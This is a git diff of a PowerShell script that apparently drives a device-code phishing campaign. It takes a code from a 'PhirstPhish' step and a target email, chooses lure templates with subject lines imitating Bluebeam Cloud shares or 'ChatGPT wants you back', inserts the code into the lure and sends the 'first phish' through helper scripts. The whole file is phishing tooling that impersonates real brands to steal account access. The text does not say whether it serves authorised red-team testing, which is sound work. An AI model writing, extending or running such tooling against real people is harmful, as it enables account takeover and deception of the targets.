@@ -1,28 +1,73 @@
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory=$false)]
-    [string]$code,
-    [Parameter(Mandatory=$false)]
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$userCode,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$subject,
-    [Parameter(Mandatory=$false)]
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$firstUser,
-    [Parameter(Mandatory=$false)]
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$template
 
 )
 
+$code = $userCode
 if(!($code)){ $code = Read-Host "Enter Device code from PhirstPhish step" }
 if(!($firstUser)){ $firstUser = Read-Host "Enter target email address"}
-.\Replace.ps1 -code $code
-if(!($template)) { $template = "bluebeam.htm"}
-$messageContent2 = Get-Content $template -Raw
 
-$subjects = @(
-    "An Adobe Cloud user has shared 'Upcoming Fine-ass Downtown Construction Project: Key Details and Timeline for Playas' with you.",
-    "An Adobe Cloud user has shared 'Invitation: Steakholder Meeting on Downtown Development Plans. B.Y.O.Beef' with you.",
-    "An Adobe Cloud user has shared 'Progress Update: Where are the gay robots?? Management is breathing down my neck.' with you.",
-    "An Adobe Cloud user has shared 'Performance Improvement Plan and General Guidelines: Ya Done Goofed.' with you."
-)
 
+# elseif($template -eq "bluebeam") { $templatePath = ".\Templates\bluebeam.htm" }
+# elseif($template -eq "blonde") { $templatePath = ".\Templates\blonde.htm" }
+# elseif($template -eq "fondo") { $templatePath = ".\Templates\fondo.htm" }
+
+# Parameters match filename in templates, if we specify a template, find it's twin, else, bluebeam
+
+# if($template -eq "chatgpt") { $templatePath = ".\Templates\chatgpt.htm" }
+# if($template -eq "chatgpt"){$templatePath = ".\Templates\chatgpt.htm"}
+
+
+$template = $template.Trim()
+
+switch ($template) {
+    "chatgpt" { 
+        $templatePath = ".\Templates\chatgpt.htm"
+        $subjects = @("ChatGPT wants you back.")
+        break 
+    }
+    "bluebeam" { 
+        $templatePath = ".\Templates\bluebeam.htm"
+        $subjects = @(
+            "A Bluebeam Cloud user has shared 'Big City Project: Key Details and Timeline' with you.",
+            "A Bluebeam Cloud user has shared 'Invitation: Steakholder Meeting on Downtown Development Plans. B.Y.O.Beef' with you.",
+            "A Bluebeam Cloud user has shared 'Progress Update: Where are the gay robots??' with you.",
+            "A Bluebeam Cloud user has shared 'Performance Improvement Plan and General Guidelines.' with you."
+        )
+        break 
+    }
+    "blonde" { 
+        $templatePath = ".\Templates\blonde.htm"
+        $subjects = @("The Girls of Heavy Industry 2024.")
+        break 
+    }
+    "fondo" { 
+        $templatePath = ".\Templates\fondo.htm"
+        $subjects = @("The Girls of Heavy Industry 2024.")
+        break 
+    }
+    default {
+        Write-Host "No matching template found for '$template'."
+        # Handle the case where no valid template is found
+        # This could be either setting a default template or exiting the script
+    }
+}
+
+
+
+Write-Output "$template template selected. Replacing code."
+.\Replace.ps1 -code $code -template $template
+
+$messageContent2 = Get-Content $templatePath -Raw
+
+Write-Output "Sending first phish."
 if(!($subject)){ $subject = Get-Random -InputObject $subjects} 
-.\Second.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject
+.\Final.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject
